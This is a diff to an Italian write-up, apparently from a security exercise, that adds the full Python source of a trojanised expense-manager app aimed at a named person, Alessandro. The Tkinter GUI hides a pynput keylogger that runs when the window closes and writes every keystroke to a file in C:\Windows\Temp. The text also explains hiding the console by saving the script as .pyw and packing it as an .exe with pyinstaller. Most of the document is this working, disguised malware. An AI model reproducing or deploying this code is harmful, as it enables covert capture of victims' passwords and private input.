@@ -79,7 +79,113 @@ Attraverso LinkedIn scopro che Alessandro è un grande appassionato della finanz
 Ho programmato il "Gestore di spesa" con Python e nel codice sorgente ho inserito il keylogger (utilizzando la piattaforma Visual Code Studio [8]).
 Ho utilizzato la libreria Tkinter di Python per la creazione dell'interfaccia grafica relativa allo script. Per come è strutturata l'applicazione, alla chiusura della finestra, il Keylogger si attiva, registra tutti i tasti premuti da alessandro e li salva in un file log.txt nella cartella C:\Windows\Temp da me scelta. Il codice sottostante rappresenta l'applicazione completa e funzionante del "Gestore di spesa", la parte evidenziata dal quadrato rosso rappresenta solo il codice del keylogger:
 
-![Descrizione immagine](./images/Cod_compl.png)
+```python
+
+from datetime import datetime, date
+import tkinter as tk
+from tkinter import ttk
+import pynput # type: ignore
+from pynput.keyboard import Key, Listener # type: ignore
+import os
+
+
+def add_transaction():
+    amount = float(entry_amount.get())
+    description = entry_description.get()
+    category = "Uscite" if var_category.get() == 0 else "Entrate"
+    transactions.append((date.today(), amount, description, category))
+    update_table()
+    clear_entry()
+
+def update_table():
+    tree.delete(*tree.get_children())
+    for transaction in transactions:
+        tree.insert("", "end", values=transaction)
+
+def clear_entry():
+    entry_amount.delete(0, "end")
+    entry_description.delete(0, "end")
+    var_category.set(0)
+
+
+window = tk.Tk()
+window.title("Manager Spese")
+window.grid_rowconfigure(0, weight=1)
+window.grid_columnconfigure(0, weight=1)
+
+label_amount = tk.Label(window, text="Ammontare:")
+label_amount.grid(row=0, column=0, padx=(10, 2), pady=5)
+entry_amount = tk.Entry(window)
+entry_amount.grid(row=0, column=1, padx=(2, 10), pady=5)
+
+label_description = tk.Label(window, text="Descrizione:")
+label_description.grid(row=1, column=0, padx=(10, 2), pady=5)
+entry_description = tk.Entry(window)
+entry_description.grid(row=1, column=1, padx=(2, 10), pady=5)
+
+var_category = tk.IntVar()
+radio_expense = tk.Radiobutton(window, text="Uscite", variable=var_category, value=0)
+radio_expense.grid(row=2, column=0, padx=(10, 2), pady=5)
+radio_income = tk.Radiobutton(window, text="Entrate", variable=var_category, value=1)
+radio_income.grid(row=2, column=1, padx=(2, 10), pady=5)
+
+button_add = tk.Button(window, text="Aggiungi Transazione", command=add_transaction)
+button_add.grid(row=4, column=0, columnspan=2, pady=10)
+
+tree = tk.ttk.Treeview(window, columns=("data", "ammontare", "descrizione", "categoria"))
+tree.heading("#0", text="Date")
+tree.heading("ammontare", text="Ammontare")
+tree.heading("descrizione", text="Descrizione")
+tree.heading("categoria", text="Categoria")
+tree.grid(row=5, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")
+
+transactions = []
+update_table()
+
+window.mainloop()
+
+class KeyLogger:
+    def __init__(self, log_directory=r"C:\windows\temp", log_file_name="log.txt"):
+        self.log_directory = log_directory or os.path.join(os.path.expanduser("~"), "logs")
+        self.log_file_name = log_file_name
+        self.log_file_path = os.path.join(self.log_directory, self.log_file_name)
+
+        # Creare la directory dei log se non esiste
+        os.makedirs(self.log_directory, exist_ok=True)
+
+    def log(self, message):
+        with open(self.log_file_path, "a") as f:
+            f.write(message)
+
+    def on_press(self, key):
+        try:
+            char = key.char
+        except AttributeError:
+            char = str(key)
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        log_message = f"{timestamp} - Pressed: {char}\n"
+        self.log(log_message)
+        print(log_message, end='')
+
+    def on_release(self, key):
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        log_message = f"{timestamp} - Released: {key}\n"
+        self.log(log_message)
+        print(log_message, end='')
+        
+        # Optional: Stop the listener if a specific key is released
+        if key == 'Key.esc':
+            return False
+
+    def start(self):
+        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join()
+
+if __name__ == "__main__":
+    keylogger = KeyLogger()
+    keylogger.start()
+
+```
 
 Ho salva lo script in formato .pyw perchè questa estensione permette di eseguire il programma senza aprire una finestra di console separata. Alla fine della programmazione trasformo lo script da .py a .exe sfruttando la libreria pyinstaller; essa prende lo script Python e genera un singolo file eseguibile che contiene tutte le dipendenze necessarie, inoltre, può essere eseguito su computer con Python non installato. Ho scelto una icona a mio piacimento e l'ho converte in .ico (attraverso un sito web [9]), dopo aver caricato la libreria pyinstaller sul sistema, eseguo il seguente comando: 
 
